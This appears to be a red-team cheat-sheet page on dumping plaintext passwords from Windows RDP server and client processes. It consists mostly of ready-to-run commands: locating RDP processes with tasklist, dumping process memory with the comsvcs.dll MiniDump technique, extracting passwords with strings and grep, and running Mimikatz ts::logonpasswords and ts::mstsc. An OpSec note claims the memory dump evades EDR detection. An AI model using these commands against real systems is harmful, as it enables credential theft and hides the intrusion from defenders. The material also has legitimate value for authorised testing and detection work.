---
title: RDP Dump
---

[[notes/mitre-attack/credential-access]] on [[notes/windows/index]] from [[notes/network/rdp]] processes.

Dump plain text passwords from RDP server processes.

=== "builtin"
    Find RDP processes holding credentials.

    ~~~ bat
    tasklist.exe /m:rdpcorets.dll
    ~~~

    Dump process memory.

    ~~~ bat
    rundll32.exe comsvcs.dll,MiniDump %PID% .\%COMPUTERNAME%.log full
    ~~~

    Extract plain passwords.

    ~~~ bash
    strings -el ./$COMPUTERNAME.log | grep -F -C3 -e '\\?\SWD#RemoteDisplayEnum#RdpIdd_IndirectDisplay&SessionId' -e $USERNAME
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe privilege::debug ts::logonpasswords exit
    ~~~

Dump plain text passwords from RDP client processes.

=== "[[notes/tools/mimikatz]]"
    ~~~ powershell
    tasklist.exe /fi "imagename eq mstsc.exe"
    .\mimikatz.exe privilege::debug ts::mstsc exit
    ~~~

> **OpSec:** Dumping regular processes without Mimikatz should not be detected by an EDR.

References:

- [ppn.snovvcrash.rocks/pentest/infrastructure/ad/credentials-dump/from-memory/svchost-exe](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credentials-dump/from-memory/svchost-exe)
